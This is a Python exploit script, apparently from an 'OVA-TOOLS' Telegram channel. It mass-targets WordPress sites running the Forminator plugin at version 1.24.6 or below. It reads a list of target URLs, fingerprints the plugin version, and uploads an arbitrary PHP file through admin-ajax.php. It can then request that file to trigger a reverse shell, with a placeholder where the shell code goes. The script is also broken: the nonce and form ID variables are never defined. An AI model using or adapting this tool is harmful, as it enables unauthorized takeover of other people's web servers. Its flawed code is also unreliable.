import requests
import datetime
import argparse
import re
import random
import string

print(r'''
[#] Create By ::
   ______      __       _______ ____   ____  _       _____ 
  / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
 | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
 | |  | |\ \/ / /\ \______| | | |  | | |  | | |     \___ \ 
 | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
  \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
                          OVA-TOOLS  https://t.me/ovacloud   
''')

def generate_random_string(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

def check_version(domain):
    version_check_url = domain.rstrip('/') + "/wp-content/plugins/forminator/readme.txt"
    try:
        response = requests.get(version_check_url, timeout=5)
        if response.status_code == 200:
            readme_content = response.text
            stable_tag_match = re.search(r"Stable tag:\s*([\d.]+)", readme_content)
            if stable_tag_match:
                stable_tag = stable_tag_match.group(1)
                if stable_tag <= "1.24.6":
                    print(f"[+] Vulnerable version found for {domain}: {stable_tag}")
                else:
                    print(f"[-] Version is not vulnerable for {domain}: {stable_tag}")
            else:
                print(f"[-] Could not determine Stable tag in readme.txt for {domain}")
        else:
            print(f"[-] Unable to fetch readme.txt for {domain}: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] An error occurred while fetching readme.txt for {domain}: {str(e)}")

def exploit(domain, page, random_length, reverse_shell):
    url = domain + "/wp-admin/admin-ajax.php"

    headers = {
        "Content-Length": "1292",
        "Accept": "*/*",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarytsSnyRY1FWmgGHpA",
        "X-Requested-With": "XMLHttpRequest",
    }

    random_filename = generate_random_string(random_length) + ".php"

    data = f"""
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="postdata-1-post-image"; filename="{random_filename}"
Content-Type: application/x-php


#here your shell code 

<?php echo "Ova-Tools" ; ?>


------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="forminator_nonce"

{forminator_nonce}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="_wp_http_referer"

{page}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="form_id"

{form_id}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="current_url"

{domain}{page}
------WebKitFormBoundarytsSnyRY1FWmgGHpA
Content-Disposition: form-data; name="action"

forminator_submit_form_custom-forms
"""

    print(f"\n[+] Sending payload to target: {domain}")
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        if response.status_code == 200:
            print("[+] Successful file upload!")
            now = datetime.datetime.now()
            current_year = now.year
            current_month = str(now.month).zfill(2)
            uploaded_file_url = f"{domain}/wp-content/uploads/{current_year}/{current_month}/{random_filename}"
            print("Uploaded File Location:", uploaded_file_url)
            if reverse_shell:
                print("\n[+] Sending request to uploaded file for reverse shell...")
                trigger_reverse_shell(uploaded_file_url)
        else:
            print(f"[-] Server returned an unexpected response for {domain}: {response.status_code}")
    except requests.Timeout:
        print(f"[-] Request timed out for {domain}. Server is unavailable.")
    except requests.RequestException as e:
        print(f"[-] An error occurred for {domain}: {str(e)}")

def trigger_reverse_shell(uploaded_file_url):
    try:
        response = requests.get(uploaded_file_url, timeout=5)
        if response.status_code == 200:
            print("[+] Successfully triggered the uploaded file for reverse shell!")
            print("[+] Check for an incoming reverse shell connection")
        else:
            print(f"[-] Server returned an unexpected response for triggering reverse shell: {response.status_code}")
    except requests.Timeout:
        print("[-] Request timed out. This could be due to the server being unavailable or because you started a reverse shell")
    except requests.RequestException as e:
        print(f"[-] An error occurred while triggering reverse shell: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="Script to check")
    parser.add_argument("-f", "--file", required=True, help="Path to a file containing a list of URLs")
    parser.add_argument("-v", "--version-check", action="store_true", help="Check for a (vulnerable) version")
    parser.add_argument("-r", "--reverse-shell", action="store_true", help="Get a reverse shell on the instance")
    parser.add_argument("-l", "--random-length", type=int, default=10, help="Length of the random string for the filename")
    args = parser.parse_args()

    with open(args.file, 'r') as file:
        urls = file.read().splitlines()

    for url in urls:
        match = re.match(r"(https?://)(.*?)(/.*)?$", url)
        if not match:
            print(f"Invalid URL format: {url}")
            continue

        domain = match.group(1) + match.group(2)
        page = match.group(3) or "/"

        if args.version_check:
            check_version(domain)
        else:
            exploit(domain, page, args.random_length, args.reverse_shell)

if __name__ == "__main__":
    main()
